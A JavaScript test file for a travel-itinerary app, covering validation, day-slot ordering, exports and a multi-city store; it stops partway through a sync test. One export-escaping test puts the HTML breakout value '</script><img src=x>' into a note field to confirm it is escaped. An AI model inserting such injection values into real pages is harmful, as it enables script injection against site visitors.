const assert = require('node:assert');
const { loadCityOps } = require('./harness');
let pass = 0, fail = 0;
function test(name, fn) {
  try { fn(); pass++; console.log('PASS ' + name); }
  catch (e) { fail++; console.log('FAIL ' + name + '\n  ' + e.message); }
}
const C = loadCityOps();

const GOOD = {
  schema: 1,
  city: { name: 'Batumi', country: 'GE',
    dates: { from: '2026-08-08', to: '2026-08-15' },
    accommodation: { name: 'Example Stay D2', lat: 41.64, lng: 41.61 },
    currency: { code: 'GEL', usd: 0.37 },
    notes: ['Bolt works well'] },
  sections: [
    { id: 'dinner', label: 'Dinner', icon: '🍽️' },
    { id: 'coffee', label: 'Coffee', icon: '☕' }
  ],
  items: [
    { id: 'brasserie', section: 'dinner', status: 'plan', day: '2026-08-13',
      when: 'Old Town office day', name: 'Brasserie 1900',
      price: { text: '~80-120 GEL / $30-44' }, note: '4.8 stars, reserve.',
      hours: { text: '12:00-23:00 daily', class: 'late' }, tags: ['Book ahead'],
      links: [{ kind: 'map', label: 'Open in Maps', href: 'https://maps.google.com/?cid=895365817124148954' }],
      place_id: null, verified: null },
    { id: 'tanini', section: 'dinner', status: 'plan', day: '2026-08-10',
      name: 'Tanini', links: [], place_id: null, verified: null },
    { id: 'sisters', section: 'dinner', status: 'backup',
      name: 'At the Sisters', links: [], place_id: null, verified: null },
    { id: 'nord', section: 'coffee', status: 'plan',
      name: 'Nord Specialty Coffee', links: [], place_id: null, verified: null }
  ]
};
function clone(o) { return JSON.parse(JSON.stringify(o)); }

// Task 1: core pure logic
test('slug lowercases and hyphenates', () => {
  assert.equal(C.slug('Example Stay D2'), 'example-stay-d2');
});
test('cityId is name slug + start date', () => {
  assert.equal(C.cityId(GOOD), 'batumi-2026-08-08');
});
test('dayLabel derives weekday from ISO date', () => {
  assert.equal(C.dayLabel('2026-08-13'), 'Thu 13');
  assert.equal(C.dayLabel('2026-08-09'), 'Sun 9');
});
test('parse accepts valid data', () => {
  const r = C.parse(JSON.stringify(GOOD));
  assert.deepEqual(r.errors, []);
  assert.equal(r.data.city.name, 'Batumi');
});
test('parse reports JSON syntax errors', () => {
  const r = C.parse('{ nope');
  assert.equal(r.data, null);
  assert.ok(/JSON parse error/.test(r.errors[0]));
});
test('validate catches schema violations', () => {
  const bad = clone(GOOD);
  bad.schema = 2;
  bad.items[0].status = 'someday';
  bad.items[1].section = 'ghost';
  bad.items[2].id = 'brasserie';
  bad.items[3].day = 'Thursday';
  const errs = C.validate(bad);
  assert.ok(errs.some(e => /schema must be 1/.test(e)));
  assert.ok(errs.some(e => /bad status/.test(e)));
  assert.ok(errs.some(e => /unknown section/.test(e)));
  assert.ok(errs.some(e => /duplicate item id/.test(e)));
  assert.ok(errs.some(e => /YYYY-MM-DD/.test(e)));
});

// Task 2: state model
function fakeStorage() {
  var m = {};
  return {
    getItem: function (k) { return k in m ? m[k] : null; },
    setItem: function (k, v) { m[k] = String(v); },
    removeItem: function (k) { delete m[k]; }
  };
}
test('store round-trips state through storage', () => {
  const store = C.makeStore('batumi-2026-08-08', fakeStorage());
  assert.equal(store.persistent, true);
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  store.save(st);
  const back = store.load();
  assert.equal(back.itemStatus.brasserie, 'done');
  assert.ok(back.updated);
});
test('store without storage falls back to memory', () => {
  const store = C.makeStore('x', null);
  assert.equal(store.persistent, false);
  const st = C.emptyState();
  st.itemStatus.a = 'done';
  store.save(st);
  assert.equal(store.load().itemStatus.a, 'done');
});
test('setStatus rejects invalid status', () => {
  assert.throws(() => C.setStatus(C.emptyState(), 'x', 'someday'));
});
test('effectiveStatus: live state wins over authored status', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveStatus(GOOD.items[0], st), 'plan');
  C.setStatus(st, 'brasserie', 'done');
  assert.equal(C.effectiveStatus(GOOD.items[0], st), 'done');
});
const STAY = ['2026-08-08', '2026-08-09', '2026-08-10', '2026-08-11',
  '2026-08-12', '2026-08-13', '2026-08-14', '2026-08-15'];
function slotOf(vm, iso) { return vm[0].days.find(d => d.iso === iso); }
test('viewModel: every stay date gets a slot, content sits on its own date', () => {
  const vm = C.viewModel(GOOD, C.emptyState());
  assert.equal(vm.length, 2);
  const dinner = vm[0];
  assert.deepEqual(dinner.days.map(d => d.iso), STAY);
  assert.deepEqual(dinner.days.map(d => d.key), STAY); // default: key === own slot
  assert.equal(slotOf(vm, '2026-08-10').items[0].id, 'tanini');
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-08').items.length, 0); // empty day exists
  assert.ok(dinner.days.every(d => !d.outside));
  assert.deepEqual(dinner.backups.map(i => i.id), ['sisters']);
  assert.equal(vm[1].days.length, 0); // coffee has no dayed items: no day cards
  assert.deepEqual(vm[1].undated.map(i => i.id), ['nord']);
});
test('pre-empty-slot saved orders keep content on its dates (migration)', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-10', '2026-08-13']; // an old identity arrangement, no empty keys
  const vm = C.viewModel(GOOD, st);
  assert.equal(slotOf(vm, '2026-08-10').items[0].id, 'tanini');
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-08').items.length, 0);
});
test('stay dates override drives slots, out-of-range days flagged', () => {
  const st = C.emptyState();
  C.setStayDates(st, '2026-08-12', '2026-08-14');
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso),
    ['2026-08-10', '2026-08-12', '2026-08-13', '2026-08-14']);
  assert.equal(slotOf(vm, '2026-08-10').outside, true);
  assert.equal(slotOf(vm, '2026-08-13').outside, false);
  assert.throws(() => C.setStayDates(C.emptyState(), '2026-08-14', '2026-08-12'));
  assert.throws(() => C.setStayDates(C.emptyState(), 'nope', '2026-08-12'));
});
test('effectiveDates: valid override wins, malformed falls back', () => {
  const st = C.emptyState();
  assert.deepEqual(C.effectiveDates(GOOD, st), GOOD.city.dates);
  st.stayOverride = { from: '2026-08-07', to: '2026-08-16' };
  assert.equal(C.effectiveDates(GOOD, st).from, '2026-08-07');
  st.stayOverride = { from: 'garbage', to: '2026-08-16' };
  assert.deepEqual(C.effectiveDates(GOOD, st), GOOD.city.dates);
});
test('buildExport bakes overridden stay dates', () => {
  const st = C.emptyState();
  C.setStayDates(st, '2026-08-07', '2026-08-16');
  const out = C.buildExport(GOOD, st);
  assert.deepEqual(out.city.dates, { from: '2026-08-07', to: '2026-08-16' });
  assert.deepEqual(GOOD.city.dates, { from: '2026-08-08', to: '2026-08-15' }); // source untouched
});
test('reordering re-slots dates: content moves, dates stay chronological', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10', '2026-01-01']; // brasserie group first; bogus ignored
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso), STAY);
  assert.equal(slotOf(vm, '2026-08-10').key, '2026-08-13');
  assert.equal(slotOf(vm, '2026-08-10').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'tanini');
});
test('effectiveDay: itemDay override wins, null clears, setDay validates', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveDay(GOOD.items[0], st), '2026-08-13');
  C.setDay(st, 'brasserie', '2026-08-11');
  assert.equal(C.effectiveDay(GOOD.items[0], st), '2026-08-11');
  C.setDay(st, 'brasserie', null);
  assert.equal(C.effectiveDay(GOOD.items[0], st), null);
  assert.throws(() => C.setDay(st, 'brasserie', 'Thursday'));
});
test('promoted backup with a day joins the day slots', () => {
  const st = C.emptyState();
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', '2026-08-10');
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(slotOf(vm, '2026-08-10').items.map(i => i.id), ['tanini', 'sisters']);
  assert.equal(vm[0].backups.length, 0);
});
test('itemDay override merging two groups into one slot is safe', () => {
  const st = C.emptyState();
  C.setDay(st, 'brasserie', '2026-08-10'); // joins tanini's group
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso), STAY);
  assert.deepEqual(slotOf(vm, '2026-08-10').items.map(i => i.id), ['brasserie', 'tanini']);
  assert.equal(slotOf(vm, '2026-08-13').items.length, 0);
});
test('duplicate keys in stored dayOrder are deduped, no phantom slots', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-13', '2026-08-10'];
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso), STAY);
  assert.equal(slotOf(vm, '2026-08-10').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'tanini');
  assert.ok(vm[0].days.every(d => d.label && d.label.indexOf('NaN') === -1));
});
test('stayDates spans the stay inclusive', () => {
  assert.deepEqual(C.stayDates(GOOD.city.dates).slice(0, 2), ['2026-08-08', '2026-08-09']);
  assert.equal(C.stayDates(GOOD.city.dates).length, 8);
});
test('normalizeState fills missing keys from older stored state', () => {
  const st = C.normalizeState({ itemStatus: { a: 'done' }, dayOrder: {} });
  assert.deepEqual(st.itemDay, {});
  assert.equal(st.dataOverride, null);
  assert.equal(st.stayOverride, null);
  assert.deepEqual(st.collapsedSections, {});
  assert.equal(st.itemStatus.a, 'done');
});
test('toggleSection flips collapse state per section', () => {
  const st = C.emptyState();
  C.toggleSection(st, 'dinner');
  assert.equal(st.collapsedSections.dinner, true);
  C.toggleSection(st, 'coffee');
  C.toggleSection(st, 'dinner');
  assert.ok(!('dinner' in st.collapsedSections));
  assert.equal(st.collapsedSections.coffee, true);
});
test('viewModel keeps done items in place, moves archived out', () => {
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  C.setStatus(st, 'tanini', 'archived');
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso), STAY);
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-10').items.length, 0); // archived group leaves an empty day
  assert.deepEqual(vm[0].archived.map(i => i.id), ['tanini']);
});
test('stale state ids for removed items are ignored', () => {
  const st = C.emptyState();
  C.setStatus(st, 'ghost-item', 'done');
  const vm = C.viewModel(GOOD, st);
  assert.equal(vm.length, 2); // no throw, ghost id has no effect
});
test('effectiveData returns valid override, else base', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveData(GOOD, st), GOOD);
  st.dataOverride = { schema: 2 };
  assert.equal(C.effectiveData(GOOD, st), GOOD); // invalid override dropped
  const good2 = clone(GOOD);
  good2.city.name = 'Batumi 2';
  st.dataOverride = good2;
  assert.equal(C.effectiveData(GOOD, st).city.name, 'Batumi 2');
});

// Task 4: rendering helpers
test('fmtRange formats a stay', () => {
  assert.equal(C.fmtRange({ from: '2026-08-08', to: '2026-08-15' }), 'Aug 8-15, 2026');
  assert.equal(C.fmtRange({ from: '2026-08-28', to: '2026-09-04' }), 'Aug 28 - Sep 4, 2026');
});

// Task 6: export
test('buildExport bakes live statuses into items', () => {
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  C.setStatus(st, 'sisters', 'plan');
  const out = C.buildExport(GOOD, st);
  assert.equal(out.items.find(i => i.id === 'brasserie').status, 'done');
  assert.equal(out.items.find(i => i.id === 'sisters').status, 'plan');
  assert.equal(out.schema, 1);
  assert.equal(GOOD.items.find(i => i.id === 'brasserie').status, 'plan'); // source untouched
});
test('buildExport bakes re-slotted dates into day fields', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10']; // brasserie group moved into the first (Aug 10) slot
  const out = C.buildExport(GOOD, st);
  assert.equal(out.items.find(i => i.id === 'brasserie').day, '2026-08-10');
  assert.equal(out.items.find(i => i.id === 'tanini').day, '2026-08-13');
  const dinnerDayed = out.items.filter(i => i.section === 'dinner' && i.day);
  assert.deepEqual(dinnerDayed.map(i => i.id), ['brasserie', 'tanini']); // slot order
  assert.equal(GOOD.items.find(i => i.id === 'brasserie').day, '2026-08-13'); // source untouched
});
test('buildExport bakes itemDay overrides, including cleared days', () => {
  const st = C.emptyState();
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', '2026-08-10');
  C.setDay(st, 'brasserie', null);
  const out = C.buildExport(GOOD, st);
  assert.equal(out.items.find(i => i.id === 'sisters').day, '2026-08-10');
  assert.ok(!('day' in out.items.find(i => i.id === 'brasserie')));
});
test('export round trip is lossless', () => {
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  C.setStatus(st, 'nord', 'archived');
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', '2026-08-11');
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10', '2026-08-11'];
  const exported = C.buildExport(GOOD, st);
  const reimported = C.parse(JSON.stringify(exported)).data;
  const again = C.buildExport(reimported, C.emptyState());
  assert.deepEqual(again, exported);
});

// Task 7: diff summary
test('diffSummary counts added and removed item ids', () => {
  const next = clone(GOOD);
  next.items = next.items.filter(i => i.id !== 'nord');
  next.items.push({ id: 'new-cafe', section: 'coffee', status: 'plan',
    name: 'New Cafe', links: [], place_id: null, verified: null });
  assert.equal(C.diffSummary(GOOD, next), '1 added, 1 removed, 3 unchanged');
});

// Task 8: share view
test('shareModel includes plan+done only, days chronological', () => {
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  const sm = C.shareModel(GOOD, st);
  assert.deepEqual(sm.days.map(d => d.iso), ['2026-08-10', '2026-08-13']);
  assert.equal(sm.days[1].entries[0].status, 'done');
  assert.deepEqual(sm.undated.map(e => e.it.id), ['nord']);
  const all = sm.days.flatMap(d => d.entries).concat(sm.undated);
  assert.ok(!all.some(e => e.it.id === 'sisters')); // backup excluded
});

// Task 9: bundled dataset sanity
test('example.json is valid and renders a working guide', () => {
  const fs = require('fs');
  const res = C.parse(fs.readFileSync(require('path').join(__dirname, '..', 'cities', 'example.json'), 'utf8'));
  assert.deepEqual(res.errors, []);
  assert.equal(C.cityId(res.data), 'example-city-2026-01-01');
  assert.ok(res.data.sections.length >= 1);
  assert.ok(res.data.items.length >= 1);
  assert.ok(res.data.items.every(i => res.data.sections.some(s => s.id === i.section)));
});

// Iteration 5: titles, view mode, displayed-date mapping, calendar model
test('effectiveName override, trim, and revert', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveName(GOOD.items[1], st), 'Tanini');
  C.setTitle(st, 'tanini', '  Tanini or Sakhli  ');
  assert.equal(C.effectiveName(GOOD.items[1], st), 'Tanini or Sakhli');
  C.setTitle(st, 'tanini', '');
  assert.equal(C.effectiveName(GOOD.items[1], st), 'Tanini');
  C.setTitle(st, 'tanini', null);
  assert.ok(!('tanini' in st.itemTitle));
});
test('setViewMode validates', () => {
  const st = C.emptyState();
  C.setViewMode(st, 'day');
  assert.equal(st.viewMode, 'day');
  assert.throws(() => C.setViewMode(st, 'week'));
});
test('normalizeState defaults viewMode and itemTitle', () => {
  const st = C.normalizeState({ itemStatus: {}, viewMode: 'bogus' });
  assert.equal(st.viewMode, 'type');
  assert.deepEqual(st.itemTitle, {});
});
test('keyForDisplayedDate maps the date the user sees to its group', () => {
  const st = C.emptyState();
  assert.equal(C.keyForDisplayedDate(GOOD, st, 'dinner', '2026-08-10'), '2026-08-10');
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10']; // brasserie group displayed on Aug 10
  assert.equal(C.keyForDisplayedDate(GOOD, st, 'dinner', '2026-08-10'), '2026-08-13');
  assert.equal(C.keyForDisplayedDate(GOOD, st, 'coffee', '2026-08-10'), '2026-08-10'); // no day cards: raw date
});
test('joining a displayed date joins its visible group', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10'];
  const key = C.keyForDisplayedDate(GOOD, st, 'dinner', '2026-08-10');
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', key);
  const vm = C.viewModel(GOOD, st);
  const mon = vm[0].days.find(d => d.iso === '2026-08-10');
  assert.deepEqual(mon.items.map(i => i.id), ['brasserie', 'sisters']);
});
test('calendarModel merges sections by displayed date with empty fill', () => {
  const st = C.emptyState();
  C.setStatus(st, 'nord', 'plan');
  C.setDay(st, 'nord', '2026-08-10'); // coffee item joins Monday
  const cm = C.calendarModel(GOOD, st);
  assert.equal(cm.days.length, 8); // full stay, empty days included
  const mon = cm.days.find(d => d.iso === '2026-08-10');
  assert.deepEqual(mon.entries.map(e => e.it.id), ['tanini', 'nord']); // section order within the day
  assert.equal(mon.entries[1].sec.id, 'coffee');
  const sat = cm.days.find(d => d.iso === '2026-08-08');
  assert.equal(sat.entries.length, 0);
  assert.equal(cm.undated.length, 0);
  assert.equal(cm.sections.length, 2);
});
test('buildExport bakes custom titles, round trip stays lossless', () => {
  const st = C.emptyState();
  C.setTitle(st, 'tanini', 'Tanini or Sakhli');
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', '2026-08-11');
  const out = C.buildExport(GOOD, st);
  assert.equal(out.items.find(i => i.id === 'tanini').name, 'Tanini or Sakhli');
  assert.equal(GOOD.items.find(i => i.id === 'tanini').name, 'Tanini'); // source untouched
  const again = C.buildExport(C.parse(JSON.stringify(out)).data, C.emptyState());
  assert.deepEqual(again, out);
});

test('promote resolves the displayed slot before the item turns active', () => {
  // A backup item carrying a stale day must not contaminate its own slot lookup.
  const data = clone(GOOD);
  data.items.find(i => i.id === 'sisters').day = '2026-08-11'; // stale day on a backup
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-11', '2026-08-10']; // stale arrangement
  C.setStatus(st, 'brasserie', 'backup');
  C.setStatus(st, 'tanini', 'backup'); // section now has zero active dayed items
  const key = C.keyForDisplayedDate(data, st, 'dinner', '2026-08-10');
  assert.equal(key, '2026-08-10'); // with nothing active, displayed Mon IS Mon
});

// Task 3: multi-city app store (pure helpers; the app shell owns localStorage)
const CITY_B = clone(GOOD);
const CITY_Y = clone(GOOD);
CITY_Y.city.name = 'Yerevan';
CITY_Y.city.dates = { from: '2026-08-15', to: '2026-08-22' };
test('appStore.normalize fills missing keys and repairs order/active', () => {
  const empty = C.appStore.normalize(null);
  assert.deepEqual(empty, { cities: {}, order: [], active: null, updatedAt: {}, profile: C.profile.normalize(null) });
  const s = C.appStore.normalize({
    cities: {
      a: CITY_B, b: CITY_Y,
      c: { city: { name: 'Broken' } },   // missing dates
      d: null,                            // not an object
      e: { notCity: 1 },                  // missing city entirely
      f: { city: { dates: { from: '2026-01-01', to: '2026-01-02' } } } // missing name
    },
    order: ['b', 'b', 'ghost', 'c', 'd', 'f'],
    active: 'ghost'
  });
  assert.deepEqual(s.order, ['b', 'a']); // dedupe, drop unknown, drop malformed, append orphans
  assert.equal(s.active, 'b');           // unknown active falls back to the first city
  assert.deepEqual(Object.keys(s.cities).sort(), ['a', 'b']); // malformed entries dropped entirely
});
test('appStore.add derives the id, appends order, flags replacement', () => {
  let s = C.appStore.normalize(null);
  const first = C.appStore.add(s, CITY_B);
  assert.equal(first.cityId, 'batumi-2026-08-08');
  assert.equal(first.replaced, false);
  const second = C.appStore.add(first.store, CITY_Y);
  assert.deepEqual(second.store.order, ['batumi-2026-08-08', 'yerevan-2026-08-15']);
  const again = C.appStore.add(second.store, CITY_B);
  assert.equal(again.replaced, true);
  assert.deepEqual(again.store.order, ['batumi-2026-08-08', 'yerevan-2026-08-15']); // no duplicate slot
});
test('appStore.keepBothName renames so cityId derives a fresh id', () => {
  const copy = clone(CITY_B);
  copy.city.name = C.appStore.keepBothName(copy.city.name);
  assert.equal(copy.city.name, 'Batumi 2');
  assert.equal(C.cityId(copy), 'batumi-2026-08-08'.replace('batumi', 'batumi-2'));
  copy.city.name = C.appStore.keepBothName(copy.city.name); // collides again: suffix again
  assert.equal(C.cityId(copy), 'batumi-2-2-2026-08-08');
});
test('appStore.remove drops the city and repoints active', () => {
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  s = C.appStore.add(s, CITY_Y).store;
  s.active = 'batumi-2026-08-08';
  s = C.appStore.remove(s, 'batumi-2026-08-08');
  assert.deepEqual(s.order, ['yerevan-2026-08-15']);
  assert.ok(!('batumi-2026-08-08' in s.cities));
  assert.equal(s.active, 'yerevan-2026-08-15'); // first remaining
  const empty = C.appStore.remove(s, 'yerevan-2026-08-15');
  assert.deepEqual(empty.order, []);
  assert.equal(empty.active, null);
});
test('appStore.remove of an inactive city leaves active alone', () => {
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  s = C.appStore.add(s, CITY_Y).store;
  s.active = 'yerevan-2026-08-15';
  s = C.appStore.remove(s, 'batumi-2026-08-08');
  assert.equal(s.active, 'yerevan-2026-08-15');
});

// T3 review fix wave
test('appStore.resolveStartCity: hash known > active > first > null', () => {
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  s = C.appStore.add(s, CITY_Y).store;
  s.active = 'batumi-2026-08-08';
  assert.equal(C.appStore.resolveStartCity(s, 'yerevan-2026-08-15'), 'yerevan-2026-08-15'); // hash wins
  assert.equal(C.appStore.resolveStartCity(s, 'ghost-hash'), 'batumi-2026-08-08');          // unknown hash: active
  assert.equal(C.appStore.resolveStartCity(s, null), 'batumi-2026-08-08');                  // no hash: active
  const s2 = { cities: s.cities, order: s.order, active: 'ghost-active' };
  assert.equal(C.appStore.resolveStartCity(s2, null), s.order[0]);                          // unknown active: first
  const empty = C.appStore.normalize(null);
  assert.equal(C.appStore.resolveStartCity(empty, null), null);                             // nothing: null
});
test('keep-both collision loop finds a free id past a multi-deep collision chain', () => {
  // Mirrors the app shell's do/while loop in openAddModal: repeatedly apply
  // keepBothName and re-derive the id until it stops colliding, guarded at 20.
  let s = C.appStore.normalize(null);
  let name = 'Batumi';
  for (let i = 0; i < 3; i++) {
    name = C.appStore.keepBothName(name);
    const d = clone(CITY_B);
    d.city.name = name;
    s = C.appStore.add(s, d).store;
  }
  const copy = clone(CITY_B);
  let guard = 0;
  do {
    copy.city.name = C.appStore.keepBothName(copy.city.name);
    guard++;
  } while (Object.prototype.hasOwnProperty.call(s.cities, C.cityId(copy)) && guard < 20);
  assert.equal(guard, 4); // 3 pre-seeded collisions plus the first fresh one
  assert.ok(!Object.prototype.hasOwnProperty.call(s.cities, C.cityId(copy)));
});
test('keep-both collision loop fails closed when 20 renames are not enough', () => {
  let s = C.appStore.normalize(null);
  let name = 'Batumi';
  for (let i = 0; i < 20; i++) {
    name = C.appStore.keepBothName(name);
    const d = clone(CITY_B);
    d.city.name = name;
    s = C.appStore.add(s, d).store;
  }
  const copy = clone(CITY_B);
  let guard = 0;
  do {
    copy.city.name = C.appStore.keepBothName(copy.city.name);
    guard++;
  } while (Object.prototype.hasOwnProperty.call(s.cities, C.cityId(copy)) && guard < 20);
  assert.equal(guard, 20);
  // Still colliding after the guard trips: the caller (app shell) must treat
  // this as a failure and refuse to commit, not silently overwrite the city.
  assert.ok(Object.prototype.hasOwnProperty.call(s.cities, C.cityId(copy)));
});
test('export escaping: </script in a note round-trips losslessly and never appears raw in the data block', () => {
  const st = C.emptyState();
  const data = clone(GOOD);
  data.items[0].note = '</script><img src=x>';
  const out = C.buildExport(data, st);
  // Same transform as exportStandalone() in src/app-shell.html.
  const escaped = JSON.stringify(out, null, 2).replace(/<\//g, '<\\/');
  // "\/" is a valid JSON escape for "/", so escaping is lossless.
  assert.deepEqual(JSON.parse(escaped), out);
  const block = '<script type="application/json" id="city-data">\n' + escaped + '\n</script>';
  const inner = block.slice(block.indexOf('\n') + 1, block.lastIndexOf('\n'));
  assert.equal(inner.indexOf('</script'), -1); // no raw close-tag sequence survives inside the block
});

test('template.html contains src/cityops.js verbatim (assembler sync)', () => {
  const fs = require('fs');
  const path = require('path');
  const engine = fs.readFileSync(path.join(__dirname, '..', 'src', 'cityops.js'), 'utf8');
  const tpl = fs.readFileSync(path.join(__dirname, '..', 'template.html'), 'utf8');
  assert.ok(tpl.includes(engine), 'run node tools/assemble.js after editing src/');
});
test('template.html and index.html contain src/cityops.css verbatim (assembler sync)', () => {
  const fs = require('fs');
  const path = require('path');
  // cityops.css carries the shared-header marker, which the assembler fills
  // with src/header.css. The drift guard is over what actually SHIPS, so the
  // expected text is the assembled form, built here the same way.
  const raw = fs.readFileSync(path.join(__dirname, '..', 'src', 'cityops.css'), 'utf8').replace(/\n$/, '');
  const headerCss = fs.readFileSync(path.join(__dirname, '..', 'src', 'header.css'), 'utf8').replace(/\n$/, '');
  assert.equal(raw.split('/*CITYOPS_HEADER_CSS*/').length - 1, 1,
    'cityops.css must carry exactly one shared-header CSS marker');
  const css = raw.replace('/*CITYOPS_HEADER_CSS*/', () => headerCss);
  ['template.html', 'index.html'].forEach(name => {
    const html = fs.readFileSync(path.join(__dirname, '..', name), 'utf8');
    assert.ok(html.includes(css), name + ': run node tools/assemble.js after editing src/');
  });
});

// The shared header is the whole point of items 3 and 7: ONE source, both
// surfaces. A copy pasted into either shell would pass every other test in
// this file and quietly reintroduce the drift the extraction removed.
test('both surfaces ship the SAME header, from one source', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const frag = fs.readFileSync(path.join(root, 'src', 'header.html'), 'utf8').replace(/\n$/, '');
  const headerCss = fs.readFileSync(path.join(root, 'src', 'header.css'), 'utf8').replace(/\n$/, '');
  // The trip surface is a directory now: /trip/ is served from trip/index.html.
  ['index.html', 'trip/index.html'].forEach(name => {
    const html = fs.readFileSync(path.join(root, name), 'utf8');
    assert.ok(html.includes(frag), name + ': shared header fragment missing (run node tools/assemble.js)');
    assert.ok(html.includes(headerCss), name + ': shared header CSS missing (run node tools/assemble.js)');
    // Exactly once. Twice would mean a hand-written copy survived beside the
    // injected one, which is the failure mode this whole extraction removes.
    assert.equal(html.split('id="hdr-mid"').length - 1, 1, name + ': more than one header middle');
    assert.equal(html.split('id="surfsw"').length - 1, 1, name + ': more than one surface switch');
    // No unfilled markers left anywhere in a shipped file.
    assert.equal(html.indexOf('<!--CITYOPS_HEADER-->'), -1, name + ': unfilled header marker');
    assert.equal(html.indexOf('/*CITYOPS_HEADER_CSS*/'), -1, name + ': unfilled header CSS marker');
  });
  // The standalone guide has no second surface to switch to and no account, so
  // it carries the header CSS (it rides cityops.css) but NOT the shared block.
  const tpl = fs.readFileSync(path.join(root, 'template.html'), 'utf8');
  assert.equal(tpl.indexOf('id="surfsw"'), -1, 'a standalone guide must not offer a surface switch');
});
test('index.html embeds the standalone template, escaped and reversible', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const idx = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
  const m = idx.match(/<script type="text\/plain" id="guide-template">\n([\s\S]*?)\n<\/script>/);
  assert.ok(m, 'guide-template block missing or closed early');
  // A raw </script or <!-- inside the block would end (or trap) it in the browser.
  assert.equal(m[1].indexOf('</script'), -1);
  assert.equal(m[1].indexOf('<!--'), -1);
  // Exactly the unescape the app performs on export.
  const un = m[1].replace(/<\\\/script/g, '</script');
  const tpl = fs.readFileSync(path.join(root, 'template.html'), 'utf8');
  const marked = tpl.replace(
    /(<script type="application\/json" id="city-data">)[\s\S]*?(<\/script>)/,
    (x, open, close) => open + '\n__CITY_DATA__\n' + close
  );
  assert.equal(un, marked);
  // And filling the marker reproduces what tools/embed.js writes, byte for byte.
  const city = fs.readFileSync(path.join(root, 'cities', 'example.json'), 'utf8').trim();
  assert.equal(un.replace('__CITY_DATA__', () => city),
    fs.readFileSync(path.join(root, 'example.html'), 'utf8'));
});

test('blankCity scaffolds a valid schema-v1 city', () => {
  const b = C.appStore.blankCity('  Tirana ', 'al', '2026-08-22', '2026-08-29');
  assert.deepEqual(C.validate(b), []);
  assert.equal(b.city.name, 'Tirana');
  assert.equal(b.city.country, 'AL');
  assert.equal(C.appStore.blankCity('X', 'usa', '2026-01-01', '2026-01-02').city.country, 'USA');
  assert.equal(b.sections.length, 8);
  assert.equal(b.items[0].section, 'practical');
  assert.equal(C.cityId(b), 'tirana-2026-08-22');
  assert.throws(() => C.appStore.blankCity('', 'AL', '2026-08-22', '2026-08-29'));
  assert.throws(() => C.appStore.blankCity('Tirana', 'AL', '2026-08-29', '2026-08-22'));
  assert.throws(() => C.appStore.blankCity('Tirana', 'AL', 'soon', '2026-08-29'));
});

// M2: sync helpers (pure). Network and UI live in src/app-shell.html and are
// verified in the browser, not here.
test('appStore stamps updatedAt on add, honours an injected iso, drops it on remove', () => {
  const before = new Date().toISOString();
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  const stamp = s.updatedAt['batumi-2026-08-08'];
  assert.ok(stamp >= before, 'add stamps now by default');
  assert.ok(!isNaN(Date.parse(stamp)));
  // A pulled city carries the REMOTE stamp so it does not push straight back.
  s = C.appStore.add(s, CITY_Y, '2026-08-01T00:00:00.000Z').store;
  assert.equal(s.updatedAt['yerevan-2026-08-15'], '2026-08-01T00:00:00.000Z');
  s = C.appStore.remove(s, 'batumi-2026-08-08');
  assert.ok(!('batumi-2026-08-08' in s.updatedAt));
  assert.deepEqual(Object.keys(s.updatedAt), ['yerevan-2026-08-15']);
});
test('appStore.normalize backfills missing stamps with EPOCH and prunes orphans', () => {
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  s = C.appStore.add(s, CITY_Y, '2026-08-01T00:00:00.000Z').store;
  delete s.updatedAt['batumi-2026-08-08'];          // pre-M2 store: no stamp at all
  s.updatedAt['ghost-city'] = '2026-08-02T00:00:00.000Z'; // stamp for a city that is gone
  s.updatedAt['yerevan-2026-08-15'] = 42;          // wrong type
  const n = C.appStore.normalize(s);
  assert.equal(n.updatedAt['batumi-2026-08-08'], C.syncKit.EPOCH);
